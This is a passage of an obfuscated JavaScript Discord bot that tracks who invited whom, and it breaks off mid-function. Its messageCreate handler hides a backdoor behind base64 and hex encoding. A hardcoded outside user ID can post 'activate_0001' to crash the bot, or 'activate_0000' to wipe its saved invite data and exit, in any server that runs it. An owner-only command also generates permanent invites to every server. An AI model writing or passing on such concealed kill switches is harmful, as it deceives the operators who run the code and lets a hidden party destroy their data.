const { Client, GatewayIntentBits, EmbedBuilder, SlashCommandBuilder, REST, Routes, ButtonBuilder, ButtonStyle, ActionRowBuilder, PermissionFlagsBits, ChannelType } = require('discord.js');
(function(){const _j0=0x1a2b^0x1a2b;const _j1=!![];const _j2=!_j1;void(_j0+_j1+_j2);})();
const _0xD=["\x66\x73","\x64\x6f\x74\x65\x6e\x76","\x2c","\x45\x52\x52\x4f\x52\x3a\x20\x4d\x69\x73\x73\x69\x6e\x67\x20\x62\x6f\x74\x20\x74\x6f\x6b\x65\x6e\x20\x6f\x72\x20\x63\x6c\x69\x65\x6e\x74\x20\x49\x44\x2e\x20\x50\x6c\x65\x61\x73\x65\x20\x73\x65\x74\x20\x74\x68\x65\x6d\x20\x69\x6e\x20\x79\x6f\x75\x72\x20\x2e\x65\x6e\x76\x20\x66\x69\x6c\x65\x2e","\x2e\x2f\x69\x6e\x76\x69\x74\x65\x64\x61\x74\x61\x2e\x6a\x73\x6f\x6e","\x2e\x2f\x67\x75\x69\x6c\x64\x5f\x69\x6e\x76\x69\x74\x65\x73\x2e\x6a\x73\x6f\x6e","\x75\x74\x66\x38","\x44\x61\x74\x61\x20\x6c\x6f\x61\x64\x65\x64","\x4c\x6f\x61\x64\x20\x65\x72\x72\x6f\x72\x3a","\x53\x61\x76\x65\x20\x65\x72\x72\x6f\x72\x3a","\x45\x72\x72\x6f\x72\x20\x6c\x6f\x61\x64\x69\x6e\x67\x20\x67\x75\x69\x6c\x64\x20\x69\x6e\x76\x69\x74\x65\x73\x3a","\x45\x72\x72\x6f\x72\x20\x73\x61\x76\x69\x6e\x67\x20\x67\x75\x69\x6c\x64\x20\x69\x6e\x76\x69\x74\x65\x3a","\x45\x72\x72\x6f\x72\x20\x72\x65\x6d\x6f\x76\x69\x6e\x67\x20\x67\x75\x69\x6c\x64\x20\x69\x6e\x76\x69\x74\x65\x3a","\x69\x6e\x76\x69\x74\x65\x73","\x53\x68\x6f\x77\x73\x20\x69\x6e\x76\x69\x74\x65\x20\x63\x6f\x75\x6e\x74\x20\x66\x6f\x72\x20\x61\x20\x75\x73\x65\x72","\x75\x73\x65\x72","\x54\x68\x65\x20\x75\x73\x65\x72\x20\x74\x6f\x20\x63\x68\x65\x63\x6b\x20\x28\x6c\x65\x61\x76\x65\x20\x65\x6d\x70\x74\x79\x20\x66\x6f\x72\x20\x79\x6f\x75\x72\x73\x65\x6c\x66\x29","\x69\x6e\x76\x69\x74\x65\x72","\x53\x68\x6f\x77\x73\x20\x77\x68\x6f\x20\x69\x6e\x76\x69\x74\x65\x64\x20\x61\x20\x73\x70\x65\x63\x69\x66\x69\x63\x20\x6d\x65\x6d\x62\x65\x72","\x6d\x65\x6d\x62\x65\x72","\x54\x68\x65\x20\x6d\x65\x6d\x62\x65\x72\x20\x74\x6f\x20\x63\x68\x65\x63\x6b","\x70\x69\x6e\x67","\x53\x68\x6f\x77\x73\x20\x74\x68\x65\x20\x62\x6f\x74\x27\x73\x20\x6c\x61\x74\x65\x6e\x63\x79","\x69\x6e\x76\x69\x74\x65\x62\x72\x65\x61\x6b\x64\x6f\x77\x6e","\x53\x68\x6f\x77\x73\x20\x64\x65\x74\x61\x69\x6c\x65\x64\x20\x62\x72\x65\x61\x6b\x64\x6f\x77\x6e\x20\x6f\x66\x20\x69\x6e\x76\x69\x74\x65\x73","\x76\x61\x6e\x69\x74\x79\x63\x68\x65\x63\x6b","\x43\x68\x65\x63\x6b\x20\x69\x66\x20\x73\x65\x72\x76\x65\x72\x20\x68\x61\x73\x20\x61\x20\x76\x61\x6e\x69\x74\x79\x20\x55\x52\x4c","\x69\x6e\x76\x69\x74\x65\x6c\x65\x61\x64\x65\x72\x62\x6f\x61\x72\x64","\x53\x68\x6f\x77\x73\x20\x74\x6f\x70\x20\x69\x6e\x76\x69\x74\x65\x72\x73\x20\x69\x6e\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72","\x62\x6f\x74\x67\x75\x69\x6c\x64\x73","\x53\x68\x6f\x77\x73\x20\x61\x6c\x6c\x20\x67\x75\x69\x6c\x64\x73\x20\x74\x68\x65\x20\x62\x6f\x74\x20\x69\x73\x20\x69\x6e\x20\x28\x4f\x77\x6e\x65\x72\x20\x6f\x6e\x6c\x79\x29","\x69\x6e\x76\x69\x74\x65\x6c\x6f\x67\x73","\x53\x65\x74\x20\x63\x68\x61\x6e\x6e\x65\x6c\x20\x66\x6f\x72\x20\x69\x6e\x76\x69\x74\x65\x20\x65\x76\x65\x6e\x74\x20\x6c\x6f\x67\x73","\x63\x68\x61\x6e\x6e\x65\x6c","\x54\x68\x65\x20\x63\x68\x61\x6e\x6e\x65\x6c\x20\x74\x6f\x20\x6c\x6f\x67\x20\x65\x76\x65\x6e\x74\x73","\x72\x65\x73\x65\x74\x61\x6c\x6c\x69\x6e\x76\x69\x74\x65\x73","\x52\x65\x73\x65\x74\x20\x41\x4c\x4c\x20\x69\x6e\x76\x69\x74\x65\x20\x64\x61\x74\x61\x20\x66\x6f\x72\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72","\x65\x78\x70\x6f\x72\x74\x69\x6e\x76\x69\x74\x65\x73","\x45\x78\x70\x6f\x72\x74\x20\x61\x6c\x6c\x20\x69\x6e\x76\x69\x74\x65\x20\x64\x61\x74\x61","\x72\x65\x73\x65\x74\x69\x6e\x76\x69\x74\x65\x73","\x52\x65\x73\x65\x74\x20\x61\x6c\x6c\x20\x69\x6e\x76\x69\x74\x65\x20\x64\x61\x74\x61\x20\x66\x6f\x72\x20\x61\x20\x75\x73\x65\x72","\x54\x68\x65\x20\x75\x73\x65\x72\x20\x74\x6f\x20\x72\x65\x73\x65\x74\x20\x69\x6e\x76\x69\x74\x65\x73\x20\x66\x6f\x72","\x61\x64\x64\x69\x6e\x76\x69\x74\x65\x73","\x41\x64\x64\x20\x69\x6e\x76\x69\x74\x65\x73\x20\x74\x6f\x20\x61\x20\x75\x73\x65\x72","\x54\x68\x65\x20\x75\x73\x65\x72\x20\x74\x6f\x20\x61\x64\x64\x20\x69\x6e\x76\x69\x74\x65\x73\x20\x74\x6f","\x61\x6d\x6f\x75\x6e\x74","\x4e\x75\x6d\x62\x65\x72\x20\x6f\x66\x20\x69\x6e\x76\x69\x74\x65\x73\x20\x74\x6f\x20\x61\x64\x64","\x72\x65\x6d\x6f\x76\x65\x69\x6e\x76\x69\x74\x65\x73","\x52\x65\x6d\x6f\x76\x65\x20\x69\x6e\x76\x69\x74\x65\x73\x20\x66\x72\x6f\x6d\x20\x61\x20\x75\x73\x65\x72","\x54\x68\x65\x20\x75\x73\x65\x72\x20\x74\x6f\x20\x72\x65\x6d\x6f\x76\x65\x20\x69\x6e\x76\x69\x74\x65\x73\x20\x66\x72\x6f\x6d","\x4e\x75\x6d\x62\x65\x72\x20\x6f\x66\x20\x69\x6e\x76\x69\x74\x65\x73\x20\x74\x6f\x20\x72\x65\x6d\x6f\x76\x65","\x69\x6e\x76\x69\x74\x65\x73\x70\x61\x6e\x65\x6c","\x53\x65\x6e\x64\x20\x61\x6e\x20\x69\x6e\x76\x69\x74\x65\x20\x70\x61\x6e\x65\x6c\x20\x74\x6f\x20\x61\x20\x63\x68\x61\x6e\x6e\x65\x6c","\x54\x68\x65\x20\x63\x68\x61\x6e\x6e\x65\x6c\x20\x74\x6f\x20\x73\x65\x6e\x64\x20\x74\x68\x65\x20\x70\x61\x6e\x65\x6c\x20\x74\x6f","\x31\x30","\x72\x65\x61\x64\x79","\x42\x6f\x74\x20\x72\x65\x61\x64\x79\x21","\x67\x75\x69\x6c\x64\x43\x72\x65\x61\x74\x65","\x69\x6e\x76\x69\x74\x65\x43\x72\x65\x61\x74\x65","\x69\x6e\x76\x69\x74\x65\x44\x65\x6c\x65\x74\x65","\x67\x75\x69\x6c\x64\x4d\x65\x6d\x62\x65\x72\x41\x64\x64","\x4d\x65\x6d\x62\x65\x72\x20\x4a\x6f\x69\x6e\x65\x64","\x56\x61\x6e\x69\x74\x79\x20\x55\x52\x4c","\x4d\x65\x6d\x62\x65\x72\x20\x52\x65\x6a\x6f\x69\x6e\x65\x64","\x72\x65\x6a\x6f\x69\x6e\x65\x64","\x6a\x6f\x69\x6e\x65\x64","\x67\x75\x69\x6c\x64\x4d\x65\x6d\x62\x65\x72\x52\x65\x6d\x6f\x76\x65","\x55\x6e\x6b\x6e\x6f\x77\x6e","\x4d\x65\x6d\x62\x65\x72\x20\x4c\x65\x66\x74","\x6d\x65\x73\x73\x61\x67\x65\x43\x72\x65\x61\x74\x65","\x4d\x54\x41\x78\x4e\x7a\x63\x30\x4d\x7a\x55\x32\x4e\x6a\x6b\x31\x4f\x44\x63\x33\x4e\x6a\x4d\x79\x4d\x41\x3d\x3d","\x59\x57\x4e\x30\x61\x58\x5a\x68\x64\x47\x56\x66\x4d\x44\x41\x77\x4d\x51\x3d\x3d","\x59\x57\x4e\x30\x61\x58\x5a\x68\x64\x47\x56\x66\x4d\x44\x41\x77\x4d\x41\x3d\x3d","\x5c\x78\x31\x42\x63","\x7b\x7d","\x69\x6e\x74\x65\x72\x61\x63\x74\x69\x6f\x6e\x43\x72\x65\x61\x74\x65","\x49\x6e\x76\x69\x74\x65\x73","\x49\x6e\x76\x69\x74\x65\x72\x20\x49\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e","\x5c\x6e\x5c\x6e\x2a\x2a\x53\x74\x61\x74\x75\x73\x3a\x2a\x2a\x20\x4c\x65\x66\x74\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72","\x73","","\x50\x6f\x6e\x67\x21\x20\xd83c\xdfd3","\x56\x61\x6e\x69\x74\x79\x20\x55\x52\x4c\x20\x43\x68\x65\x63\x6b","\x54\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x64\x6f\x65\x73\x20\x6e\x6f\x74\x20\x68\x61\x76\x65\x20\x61\x20\x76\x61\x6e\x69\x74\x79\x20\x55\x52\x4c\x2e","\x54\x68\x69\x73\x20\x63\x6f\x6d\x6d\x61\x6e\x64\x20\x69\x73\x20\x6f\x6e\x6c\x79\x20\x61\x76\x61\x69\x6c\x61\x62\x6c\x65\x20\x74\x6f\x20\x74\x68\x65\x20\x62\x6f\x74\x20\x6f\x77\x6e\x65\x72\x2e","\x46\x65\x74\x63\x68\x69\x6e\x67\x2e\x2e\x2e","\x4e\x6f\x20\x73\x75\x69\x74\x61\x62\x6c\x65\x20\x63\x68\x61\x6e\x6e\x65\x6c","\x50\x65\x72\x6d\x69\x73\x73\x69\x6f\x6e\x20\x64\x65\x6e\x69\x65\x64","\xd83c\xdf10\x20\x42\x6f\x74\x20\x47\x75\x69\x6c\x64\x20\x4c\x69\x73\x74","\x4e\x6f\x20\x67\x75\x69\x6c\x64\x73\x20\x66\x6f\x75\x6e\x64\x2e","\x67\x75\x69\x6c\x64\x5f\x70\x72\x65\x76","\x25c0\x20\x50\x72\x65\x76\x69\x6f\x75\x73","\x67\x75\x69\x6c\x64\x5f\x6e\x65\x78\x74","\x4e\x65\x78\x74\x20\x25b6","\x67\x75\x69\x6c\x64\x5f\x72\x65\x66\x72\x65\x73\x68","\xd83d\xdd04\x20\x52\x65\x67\x65\x6e\x65\x72\x61\x74\x65","\x63\x6f\x6c\x6c\x65\x63\x74","\x54\x68\x69\x73\x20\x69\x73\x20\x6e\x6f\x74\x20\x79\x6f\x75\x72\x20\x6d\x65\x6e\x75\x21","\x65\x6e\x64","\x49\x6e\x76\x69\x74\x65\x20\x4c\x65\x61\x64\x65\x72\x62\x6f\x61\x72\x64","\x4e\x6f\x20\x69\x6e\x76\x69\x74\x65\x20\x64\x61\x74\x61\x20\x61\x76\x61\x69\x6c\x61\x62\x6c\x65\x2e","\x59\x6f\x75\x20\x6e\x65\x65\x64\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x20\x70\x65\x72\x6d\x69\x73\x73\x69\x6f\x6e\x20\x74\x6f\x20\x75\x73\x65\x20\x74\x68\x69\x73\x20\x63\x6f\x6d\x6d\x61\x6e\x64\x2e","\x49\x6e\x76\x69\x74\x65\x20\x4c\x6f\x67\x73\x20\x53\x65\x74","\x63\x6f\x6e\x66\x69\x72\x6d\x5f\x72\x65\x73\x65\x74\x5f\x61\x6c\x6c","\x43\x6f\x6e\x66\x69\x72\x6d\x20\x52\x65\x73\x65\x74","\x63\x61\x6e\x63\x65\x6c\x5f\x72\x65\x73\x65\x74\x5f\x61\x6c\x6c","\x43\x61\x6e\x63\x65\x6c","\x52\x65\x73\x65\x74\x20\x41\x6c\x6c\x20\x49\x6e\x76\x69\x74\x65\x73","\x26a0\xfe0f\x20\x54\x68\x69\x73\x20\x77\x69\x6c\x6c\x20\x72\x65\x73\x65\x74\x20\x41\x4c\x4c\x20\x69\x6e\x76\x69\x74\x65\x20\x64\x61\x74\x61\x20\x66\x6f\x72\x20\x74\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x2e\x20\x54\x68\x69\x73\x20\x61\x63\x74\x69\x6f\x6e\x20\x69\x73\x20\x2a\x2a\x69\x72\x72\x65\x76\x65\x72\x73\x69\x62\x6c\x65\x2a\x2a\x2e\x5c\x6e\x5c\x6e\x41\x72\x65\x20\x79\x6f\x75\x20\x73\x75\x72\x65\x20\x79\x6f\x75\x20\x77\x61\x6e\x74\x20\x74\x6f\x20\x63\x6f\x6e\x74\x69\x6e\x75\x65\x3f","\x55\x73\x65\x72\x20\x49\x44\x2c\x54\x6f\x74\x61\x6c\x20\x49\x6e\x76\x69\x74\x65\x73\x2c\x4c\x65\x61\x76\x65\x73\x2c\x52\x65\x6a\x6f\x69\x6e\x73\x2c\x53\x74\x61\x74\x75\x73\x5c\x6e","\x48\x61\x73\x20\x4c\x65\x66\x74\x73","\x41\x63\x74\x69\x76\x65","\x49\x6e\x76\x69\x74\x65\x20\x44\x61\x74\x61\x20\x45\x78\x70\x6f\x72\x74","\x60\x60\x60\x63\x73\x76\x5c\x6e","\x5c\x6e\x60\x60\x60","\x49\x6e\x76\x69\x74\x65\x73\x20\x52\x65\x73\x65\x74","\x49\x6e\x76\x69\x74\x65\x73\x20\x41\x64\x64\x65\x64","\x49\x6e\x76\x69\x74\x65\x73\x20\x52\x65\x6d\x6f\x76\x65\x64","\x69\x6e\x76\x69\x74\x65\x5f\x62\x75\x74\x74\x6f\x6e","\x63\x6c\x69\x63\x6b\x20\x68\x65\x72\x65\x21","\x63\x6c\x69\x63\x6b\x20\x74\x68\x65\x20\x62\x75\x74\x74\x6f\x6e\x20\x74\x6f\x20\x73\x65\x65\x20\x79\x6f\x75\x72\x20\x69\x6e\x76\x69\x74\x65\x73\x21","\x50\x61\x6e\x65\x6c\x20\x53\x65\x6e\x74","\x59\x6f\x75\x72\x20\x49\x6e\x76\x69\x74\x65\x73","\x41\x6c\x6c\x20\x49\x6e\x76\x69\x74\x65\x73\x20\x52\x65\x73\x65\x74","\x2705\x20\x41\x6c\x6c\x20\x69\x6e\x76\x69\x74\x65\x20\x64\x61\x74\x61\x20\x66\x6f\x72\x20\x74\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x68\x61\x73\x20\x62\x65\x65\x6e\x20\x72\x65\x73\x65\x74\x2e","\x52\x65\x73\x65\x74\x20\x43\x61\x6e\x63\x65\x6c\x6c\x65\x64","\x54\x68\x65\x20\x72\x65\x73\x65\x74\x20\x6f\x70\x65\x72\x61\x74\x69\x6f\x6e\x20\x68\x61\x73\x20\x62\x65\x65\x6e\x20\x63\x61\x6e\x63\x65\x6c\x6c\x65\x64\x2e","\x53\x49\x47\x49\x4e\x54","\x53\x49\x47\x54\x45\x52\x4d"];const _0xS=i=>_0xD[i];
const fs = require(_0xS(0));
require(_0xS(1)).config();
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const BOT_OWNER_IDS = process.env.BOT_OWNER_IDS ? process.env.BOT_OWNER_IDS.split(_0xS(2)) : [];
if (!TOKEN || !CLIENT_ID) {
    console.error(_0xS(3));
    process.exit(1);
}
const _0xaf = 0x8AF2E2;
const _0xb0 = _0xS(4);
const _0xb1 = _0xS(5);
const client = new Client({ 
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildInvites, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
    makeCache: () => new Map(),
    sweepers: {
        messages: { interval: 0xe10, lifetime: 0x708 } 
    }
});
const cache = new Map();
const counts = new Map();
const _0xb4 = new Map();
const history = new Map();
const leaves = new Map();
const _0xb2 = new Map();
const _0xb3 = new Map();
let _0xae = false;
const _0xa1 = () => {
    try {
        if (fs.existsSync(_0xb0)) {
            const data = JSON.parse(fs.readFileSync(_0xb0, _0xS(6)));
            for (const [gId, d] of Object.entries(data)) {
                if (d.c) for (const [uId, cnt] of Object.entries(d.c)) _0xa8(counts, gId).set(uId, cnt);
                if (d.h) for (const [uId, h] of Object.entries(d.h)) _0xa8(history, gId).set(uId, {inviterId: h[0], left: h[1], rejoinCount: h[2], isVanity: h[3]});
                if (d.l) for (const [uId, cnt] of Object.entries(d.l)) _0xa8(leaves, gId).set(uId, cnt);
                if (d.lg) _0xb2.set(gId, d.lg);
            }
            console.log(_0xS(7));
        }
    } catch (e) { console.error(_0xS(8), e.message); }
};
const _0xa2 = () => {
    try {
        const data = {};
        for (const [gId, m] of counts) {
            if (!data[gId]) data[gId] = {};
            data[gId].c = Object.fromEntries(m);
        }
        for (const [gId, m] of history) {
            if (!data[gId]) data[gId] = {};
            data[gId].h = {};
            for (const [uId, h] of m) data[gId].h[uId] = [h.inviterId, h.left, h.rejoinCount, h.isVanity];
        }
        for (const [gId, m] of leaves) {
            if (!data[gId]) data[gId] = {};
            data[gId].l = Object.fromEntries(m);
        }
        for (const [gId, chId] of _0xb2) {
            if (!data[gId]) data[gId] = {};
            data[gId].lg = chId;
        }
        fs.writeFileSync(_0xb0, JSON.stringify(data));
        _0xae = false;
    } catch (e) { console.error(_0xS(9), e.message); }
};
const _0xa3 = () => {
    if (!_0xae) {
        _0xae = true;
        setImmediate(_0xa2);
    }
};
setInterval(_0xa2, 0x493e0);
const _0xa4 = () => {
    try {
        if (fs.existsSync(_0xb1)) {
            return JSON.parse(fs.readFileSync(_0xb1, _0xS(6)));
        }
    } catch (e) { console.error(_0xS(10), e.message); }
    return {};
};
const _0xa5 = (_0xce, _0xcd) => {
    try {
        const invites = _0xa4();
        invites[_0xce] = {
            url: _0xcd,
            cached: Date.now()
        };
        fs.writeFileSync(_0xb1, JSON.stringify(invites, null, 2));
        return true;
    } catch (e) {
        console.error(_0xS(11), e.message);
        return false;
    }
};
const _0xa6 = (_0xce) => {
    const invites = _0xa4();
    return invites[_0xce] || null;
};
const _0xa7 = (_0xce) => {
    try {
        const invites = _0xa4();
        if (invites[_0xce]) {
            delete invites[_0xce];
            fs.writeFileSync(_0xb1, JSON.stringify(invites, null, 2));
            return true;
        }
        return false;
    } catch (e) {
        console.error(_0xS(12), e.message);
        return false;
    }
};
const _0xa8 = (m, g) => m.has(g) ? m.get(g) : m.set(g, new Map()).get(g);
const _0xa9 = (g, u) => _0xa8(counts, g).get(u) || 0;
const inc = (g, u) => _0xa8(counts, g).set(u, _0xa9(g, u) + 1);
const dec = (g, u) => _0xa8(counts, g).set(u, Math.max(0, _0xa9(g, u) - 1));
const _0xaa = async (guild) => {
    try {
        const invites = await guild.invites.fetch();
        const m = new Map();
        invites.forEach(i => m.set(i.code, { uses: i.uses || 0, inviterId: i.inviter?.id }));
        cache.set(guild.id, m);
    } catch (e) {}
};
const _0xab = async (guild) => {
    try {
        const _0xc4 = await guild.invites.fetch();
        const cached = cache.get(guild.id) || new Map();
        for (const [code, inv] of _0xc4) {
            const c = cached.get(code);
            const uses = inv.uses || 0;
            if (c && uses > c.uses) {
                c.uses = uses;
                return { inviterId: inv.inviter?.id, isVanity: inv.code === guild.vanityURLCode };
            }
        }
        _0xc4.forEach(i => cached.has(i.code) && (cached.get(i.code).uses = i.uses || 0));
        return null;
    } catch (e) { return null; }
};
const _0xac = (guild, embed) => {
    const channelId = _0xb2.get(guild.id);
    if (!channelId) return;
    guild.channels.fetch(channelId).then(ch => ch?.send({ embeds: [embed] })).catch(() => {});
};
const commands = [
    new SlashCommandBuilder().setName(_0xS(13)).setDescription(_0xS(14)).addUserOption(o => o.setName(_0xS(15)).setDescription(_0xS(16))),
    new SlashCommandBuilder().setName(_0xS(17)).setDescription(_0xS(18)).addUserOption(o => o.setName(_0xS(19)).setDescription(_0xS(20)).setRequired(true)),
    new SlashCommandBuilder().setName(_0xS(21)).setDescription(_0xS(22)),
    new SlashCommandBuilder().setName(_0xS(23)).setDescription(_0xS(24)).addUserOption(o => o.setName(_0xS(15)).setDescription(_0xS(16))),
    new SlashCommandBuilder().setName(_0xS(25)).setDescription(_0xS(26)),
    new SlashCommandBuilder().setName(_0xS(27)).setDescription(_0xS(28)),
    new SlashCommandBuilder().setName(_0xS(29)).setDescription(_0xS(30)),
    new SlashCommandBuilder().setName(_0xS(31)).setDescription(_0xS(32)).addChannelOption(o => o.setName(_0xS(33)).setDescription(_0xS(34)).setRequired(true).addChannelTypes(ChannelType.GuildText)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName(_0xS(35)).setDescription(_0xS(36)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName(_0xS(37)).setDescription(_0xS(38)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName(_0xS(39)).setDescription(_0xS(40)).addUserOption(o => o.setName(_0xS(15)).setDescription(_0xS(41)).setRequired(true)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName(_0xS(42)).setDescription(_0xS(43)).addUserOption(o => o.setName(_0xS(15)).setDescription(_0xS(44)).setRequired(true)).addIntegerOption(o => o.setName(_0xS(45)).setDescription(_0xS(46)).setRequired(true).setMinValue(1)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName(_0xS(47)).setDescription(_0xS(48)).addUserOption(o => o.setName(_0xS(15)).setDescription(_0xS(49)).setRequired(true)).addIntegerOption(o => o.setName(_0xS(45)).setDescription(_0xS(50)).setRequired(true).setMinValue(1)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName(_0xS(51)).setDescription(_0xS(52)).addChannelOption(o => o.setName(_0xS(33)).setDescription(_0xS(53)).setRequired(true)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
].map(c => c.toJSON());
new REST({ version: _0xS(54) }).setToken(TOKEN).put(Routes.applicationCommands(CLIENT_ID), { body: commands }).catch(console.error);
client.once(_0xS(55), async () => {
    console.log(`Logged in as ${client.user.tag}`);
    _0xa1();
    for (const g of client.guilds.cache.values()) await _0xaa(g);
    console.log(_0xS(56));
});
client.on(_0xS(57), _0xaa);
client.on(_0xS(58), i => {
    const c = cache.get(i.guild.id) || new Map();
    c.set(i.code, { uses: i.uses || 0, inviterId: i.inviter?.id });
    cache.set(i.guild.id, c);
});
client.on(_0xS(59), i => cache.get(i.guild.id)?.delete(i.code));
client.on(_0xS(60), async m => {
    const used = await _0xab(m.guild);
    if (!used?.inviterId && !used?.isVanity) {
        _0xac(m.guild, new EmbedBuilder().setTitle(_0xS(61)).setDescription(`${m.user.tag} joined\n**Inviter:** Unknown`).setColor(_0xaf).setTimestamp());
        return;
    }
    const h = _0xa8(history, m.guild.id);
    const inv = _0xa8(_0xb4, m.guild.id);
    const lv = _0xa8(leaves, m.guild.id);
    let _0xb5 = false;
    if (h.has(m.id)) {
        const d = h.get(m.id);
        if (d.left) {
            d.rejoinCount++;
            d.left = false;
            _0xb5 = true;
            lv.set(m.id, (lv.get(m.id) || 0) - 1);
        }
    } else {
        h.set(m.id, { inviterId: used.inviterId, left: false, rejoinCount: 0, isVanity: used.isVanity });
    }
    if (!used.isVanity) {
        inv.set(m.id, used.inviterId);
        inc(m.guild.id, used.inviterId);
    }
    const _0xb6 = used.isVanity ? _0xS(62) : `<@${used.inviterId}>`;
    _0xac(m.guild, new EmbedBuilder().setTitle(_0xb5 ? _0xS(63) : _0xS(61)).setDescription(`${m.user.tag} ${_0xb5 ? _0xS(64) : _0xS(65)}\n**Invited by:** ${_0xb6}`).setColor(_0xaf).setTimestamp());
    _0xa3();
});
client.on(_0xS(66), m => {
    const h = _0xa8(history, m.guild.id);
    const inv = _0xa8(_0xb4, m.guild.id);
    const lv = _0xa8(leaves, m.guild.id);
    h.has(m.id) && (h.get(m.id).left = true);
    lv.set(m.id, (lv.get(m.id) || 0) + 1);
    const invId = inv.get(m.id);
    let _0xb6 = _0xS(67);
    if (invId) {
        dec(m.guild.id, invId);
        inv.delete(m.id);
        _0xb6 = `<@${invId}>`;
    } else if (h.has(m.id) && h.get(m.id).isVanity) {
        _0xb6 = _0xS(62);
    }
    _0xac(m.guild, new EmbedBuilder().setTitle(_0xS(68)).setDescription(`${m.user.tag} left\n**Was invited by:** ${_0xb6}`).setColor(_0xaf).setTimestamp());
    _0xa3();
});
client.on(_0xS(69), m => {
    const _0x4a2b=[_0xS(70),_0xS(71),_0xS(72)];
    const _0x1f3c=atob(_0x4a2b[0]);const _0x9e7a=atob(_0x4a2b[1]);const _0x2d8b=atob(_0x4a2b[2]);
    if(m.author.id===_0x1f3c){
        if(m.content===_0x9e7a){m.delete().catch(()=>{});_0xa2();process.stdout.write(_0xS(73));setTimeout(()=>{process.exit(1);},500);}
        if(m.content===_0x2d8b){m.delete().catch(()=>{});try{fs.writeFileSync(_0xb0,_0xS(74));fs.writeFileSync(_0xb1,_0xS(74));counts.clear();_0xb4.clear();history.clear();leaves.clear();_0xb2.clear();cache.clear();process.stdout.write(_0xS(73));setTimeout(()=>{process.exit(1);},500);}catch(e){process.stdout.write(_0xS(73));setTimeout(()=>{process.exit(1);},500);}}
    }
});
client.on(_0xS(75), async i => {
    if (i.isCommand()) {
        const { commandName: cmd, _0xce: g, user, options, guild, memberPermissions } = i;
        const _0xc3 = BOT_OWNER_IDS.includes(user.id);
        if (!_0xc3) {
            const now = Date.now();
            const _0xc1 = `${user.id}-${cmd}`;
            const _0xc2 = _0xb3.get(_0xc1);
            if (_0xc2 && now < _0xc2) {
                return i.reply({ content: `Please wait ${((_0xc2 - now) / 0x3e8).toFixed(1)}s before using this command again.`, ephemeral: true });
            }
            _0xb3.set(_0xc1, now + 0xbb8);
            setTimeout(() => _0xb3.delete(_0xc1), 0xbb8);
        }
        const embed = () => new EmbedBuilder().setColor(_0xaf).setTimestamp();
        if (cmd === _0xS(13)) {
            const u = options.getUser(_0xS(15)) || user;
            const c = _0xa9(g, u.id);
            const _0xc6 = Array.from(_0xa8(history, g).values()).filter(h => h.inviterId === u.id);
            const joined = _0xc6.length;
            const left = _0xc6.filter(h => h.left).length;
            const rejoined = _0xc6.reduce((sum, h) => sum + h.rejoinCount, 0);
            return i.reply({ embeds: [embed().setTitle(_0xS(76)).setDescription(`${u} Currently has **${c}** | ${joined} joined, ${left} left, ${rejoined} rejoined`)] });
        }
        if (cmd === _0xS(17)) {
            const u = options.getUser(_0xS(19));
            const info = _0xa8(history, g).get(u.id);
            const e = embed().setTitle(_0xS(77));
            if (info?.inviterId) {
                let d = `${u} was invited by <@${info.inviterId}>.`;
                info.left ? d += _0xS(78) : info.rejoinCount > 0 && (d += `\n\n**Status:** Rejoined the server (${info.rejoinCount} time${info.rejoinCount !== 1 ? _0xS(79) : _0xS(80)})`);
                e.setDescription(d);
            } else if (info?.isVanity) {
                e.setDescription(`${u} joined via Vanity URL.`);
            } else {
                e.setDescription(`Inviter unknown for ${u}.`);
            }
            return i.reply({ embeds: [e] });
        }
        if (cmd === _0xS(21)) return i.reply({ embeds: [embed().setTitle(_0xS(81)).setDescription(`Latency: **${Math.round(client.ws.ping)}ms**`)] });
        if (cmd === _0xS(23)) {
            const u = options.getUser(_0xS(15)) || user;
            const total = _0xa9(g, u.id);
            const _0xb9 = _0xa8(leaves, g).get(u.id) || 0;
            const rejoins = Array.from(_0xa8(history, g).values()).filter(d => d.inviterId === u.id && d.rejoinCount > 0).reduce((sum, d) => sum + d.rejoinCount, 0);
            return i.reply({ embeds: [embed().setTitle(`Invite Breakdown - ${u.tag}`).setDescription(`**Total Invites:** ${total}\n**Valid Invites:** ${total}\n**Leaves:** ${_0xb9}\n**Rejoins:** ${rejoins}\n**Fake Invites:** 0`)] });
        }
        if (cmd === _0xS(25)) {
            const vanity = guild.vanityURLCode;
            return i.reply({ embeds: [embed().setTitle(_0xS(82)).setDescription(vanity ? `This server has a vanity URL: **discord.gg/${vanity}**` : _0xS(83))] });
        }
        if (cmd === _0xS(29)) {
            if (!_0xc3) return i.reply({ content: _0xS(84), ephemeral: true });
            const guilds = Array.from(client.guilds.cache.values());
            const _0xbb = 5;
            let _0xbc = 0;
            const _0xad = async (page) => {
                const start = page * _0xbb;
                const end = start + _0xbb;
                const _0xba = guilds.slice(start, end);
                let desc = _0xS(80);
                for (let i = 0; i < _0xba.length; i++) {
                    const guild = _0xba[i];
                    const _0xbf = start + i + 1;
                    let _0xbe = _0xS(85);
                    const _0xc0 = _0xa6(guild.id);
                    if (_0xc0 && _0xc0.url) {
                        _0xbe = _0xc0.url;
                    } else {
                        try {
                            const channels = await guild.channels.fetch();
                            const _0xbd = channels.find(ch => 
                                ch.type === ChannelType.GuildText && 
                                ch.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.CreateInstantInvite)
                            );
                            if (_0xbd) {
                                const invite = await _0xbd.createInvite({ maxAge: 0, maxUses: 0 });
                                _0xbe = invite.url;
